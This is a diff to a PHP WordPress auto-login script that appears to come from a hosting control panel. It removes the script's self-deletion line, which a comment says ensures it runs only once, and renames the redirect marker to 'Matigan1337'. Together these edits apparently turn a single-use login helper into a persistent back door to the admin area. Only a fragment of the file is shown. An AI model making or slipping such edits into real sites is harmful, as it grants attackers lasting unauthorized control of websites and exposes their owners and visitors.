@@ -52,14 +52,13 @@ function get_user_id( $email )
 define( 'WP_USE_THEMES', true );
 $timeSinceScriptCreation = time() - stat( __FILE__ )['mtime'];
 // Delete itself to make sure it is executed only once
-unlink( __FILE__ );
 if ( ! isset( $wp_did_header ) ) {
     $wp_did_header = true;
     // Load the WordPress library.
     require_once( dirname( __FILE__ ) . '/wp-load.php' );
     // If the user is already logged in just redirect it to admin area
     if ( is_user_logged_in() ) {
-        $redirect_page = admin_url() . '?platform=hpanel';
+        $redirect_page = admin_url() . '?platform=Matigan1337';
         wp_redirect( $redirect_page );
         exit();
     }
